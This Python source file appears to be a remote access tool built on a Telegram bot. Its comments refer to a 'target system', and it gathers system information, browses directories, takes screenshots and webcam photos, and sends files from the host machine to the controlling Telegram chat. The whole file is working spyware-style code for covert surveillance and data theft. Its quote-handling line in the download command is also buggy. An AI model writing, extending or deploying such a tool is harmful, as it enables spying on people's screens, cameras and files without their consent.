#!/usr/bin/env python3
import telebot
from telebot import types  
import sys
import system
from check_settings import check_settings

# Icons 
laptop_icon = u'\U0001F4BB'

# check our bot settings
settings = check_settings()

# get information about target system
sinfo = system.get_system_info()
cur_dir = system.get_current_directory()

if settings['bot_token'] == '':
	print('Check your settings file')
	sys.exit(-1)

bot = telebot.TeleBot(settings['bot_token'])

# Send system info
@bot.message_handler(commands=['sysinfo'])
def hello_message(message):
	bot.send_message(message.chat.id, sinfo.sysname+' '+sinfo.release+' '+sinfo.machine+' '+sinfo.nodename)

# Change current directory
@bot.message_handler(commands=['dir'])
def change_dir_message(message):
	global cur_dir 
	new_dir = message.text.split(' ')

	if len(new_dir) >= 2:
		new_dir = system.change_dir(new_dir[1])

		if new_dir:
			cur_dir = new_dir
			bot.send_message(message.chat.id, f"Current directory {cur_dir}")

		else:
			bot.send_message(message.chat.id, 'Path does not exist')

# Show files from current directory
@bot.message_handler(commands=['files'])
def fileslist_message(message):
	files = system.get_files(cur_dir)
	bot.send_message(message.chat.id, files)

# Show current directory
@bot.message_handler(commands=['cwd'])
def current_dir_message(message):
	global cur_dir
	bot.send_message(message.chat.id, cur_dir)

# Make screenshot from bot's machine ;D
@bot.message_handler(commands=['screenshot'])
def screenshot_message(message):
	screen = system.make_screenshot()

	with open('screenshot.png', 'rb') as file:
		bot.send_photo(message.chat.id, file)

# Make webcam photo :)
@bot.message_handler(commands=['webcamphoto'])
def webcam_photo_message(message):
	system.make_webcam_photo()

	with open('cam.png', 'rb') as file:
		bot.send_photo(message.chat.id, file)

# Download file from bot's machine
@bot.message_handler(commands=['download'])
def download_message(message):
	command = message.text.split(' ')

	if len(command) == 2:
		if command[1].startswith('"') and command[1].endswith('"'):
			command[1] = command[1:-2]
			print(command[1])
			
		try:
			with open(cur_dir + '/' + command[1], 'rb') as file:
				bot.send_document(message.chat.id, file)

		except FileNotFoundError:
			bot.send_message(message.chat.id, 'No such file')


@bot.message_handler(commands=['help'])
def help_message(message):
	help_msg = '''/cwd - Show current directory
	/dir [dir] - Change directory
	/files - List of files in current directory
	/screenshot - Make screenshot
	/webcamphoto - Make webcam photo
	/download - Download file from host
	/sysinfo - Inforamtion about machine
	'''
	bot.send_message(message.chat.id, help_msg)


bot.polling(non_stop=True)						